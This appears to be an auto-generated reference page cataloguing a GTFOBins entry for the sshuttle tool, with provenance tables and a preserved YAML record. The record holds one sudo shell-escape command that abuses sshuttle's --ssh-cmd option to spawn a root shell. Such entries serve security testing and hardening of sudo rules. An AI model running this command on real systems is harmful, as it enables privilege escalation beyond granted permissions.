---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# sshuttle

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `sshuttle` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshuttle` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [sshuttle](../../tools/linux/sshuttle.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | sshuttle |
| name | sshuttle |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/sshuttle/ |

## Preserved Source Material

```yaml
_body: ''
_name: sshuttle
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshuttle
functions:
  shell:
  - code: sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
    contexts:
      sudo: null
```
